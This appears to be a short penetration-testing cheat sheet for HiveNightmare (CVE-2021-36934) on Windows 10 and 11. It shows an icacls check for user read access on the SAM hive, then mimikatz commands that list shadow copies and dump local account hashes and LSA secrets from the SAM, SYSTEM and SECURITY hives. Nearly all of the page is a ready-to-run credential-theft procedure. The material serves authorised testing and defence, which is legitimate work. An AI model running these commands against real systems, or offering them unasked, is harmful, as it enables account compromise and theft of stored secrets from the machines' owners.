# HiveNightmare

#### CVE-2021–36934 allows you to retrieve all registry hives \(SAM,SECURITY,SYSTEM\) in Windows 10 and 11 as a non-administrator user.

## Exploitation

Check for the vulnerability using icacls

```text
C:\Windows\System32> icacls config\SAM
```

```text
config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!                    

```

Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.

```text
mimikatz> token::whoami /full
```

#### List shadow copies available

```text
mimikatz> misc::shadowcopies
```

#### Extract account from SAM databases

```text
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

#### Extract secrets from SECURITY

```text
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```









